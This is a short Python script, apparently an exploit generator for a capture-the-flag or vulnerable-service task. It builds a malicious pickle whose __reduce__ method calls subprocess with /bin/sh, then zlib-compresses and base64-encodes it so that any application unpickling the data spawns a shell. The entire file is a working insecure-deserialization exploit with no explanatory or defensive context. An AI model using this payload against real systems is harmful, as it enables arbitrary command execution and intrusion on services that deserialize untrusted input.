import pickle
import subprocess
import zlib
import base64

class exploit():
    def __reduce__(self):
        cmd = ["/bin/sh"]
        return (subprocess.call, (cmd, ))
    
a = pickle.dumps(exploit())
a= zlib.compress(a)
a = base64.b64encode(a)
print(a.decode())
